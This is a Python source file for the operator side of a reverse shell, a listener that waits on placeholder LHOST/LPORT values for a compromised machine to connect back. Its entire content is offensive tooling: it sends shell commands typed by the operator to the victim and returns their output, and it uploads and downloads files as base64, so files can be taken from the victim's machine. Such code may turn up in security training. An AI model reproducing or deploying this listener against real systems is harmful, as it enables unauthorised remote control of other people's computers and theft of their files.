#!/usr/bin/env python

import socket, json , base64
# python version: Python 3.9.2
# reverse connection


class Listener:
	def __init__(self,ip,port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET , socket.SO_REUSEADDR, 1)
		listener.bind((ip,port))
		listener.listen(0)
		print("[+] Waiting for incoming connection")
		self.connection, address = listener.accept()  
		print("[+] Got a connection from "+str(address))

	def reliable_send(self, data):

		json_data = json.dumps(data)
		self.connection.sendall(json_data.encode('utf-8'))

	def reliable_recieve(self):
		json_data = ""
		
		while True:
			try:
				json_data = json_data + (self.connection.recv(1024)).decode('utf-8')
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_remotely(self,command):
		self.reliable_send(command)
		
		if command[0] == "exit":
			self.connection.close()
			exit()

		return self.reliable_recieve()

	def write_file(self, path,content):  # for downloading purpose
		with open(path,"wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Download successful. "

	def read_file(self, path):  # for uploading purpose
		with open (path,"rb") as file:
			return base64.b64encode(file.read())
			


	def run(self):
		while True:
			command = input(">>")
			command = command.split(" ")
			try:
				if command[0] == "upload":
					file_content = self.read_file(command[1])
					command.append((file_content).decode('utf-8'))    # ["upload","file_name","file_content"]

				result = self.execute_remotely(command)

				if command[0] == "download" and "[-] Error" not in result:
					result = self.write_file(command[1],result)
			except Exception:
				result = "[-] Error during command execution"
				
			print(result)
			

Mr = Listener("LHOST",LPORT)
Mr.run()
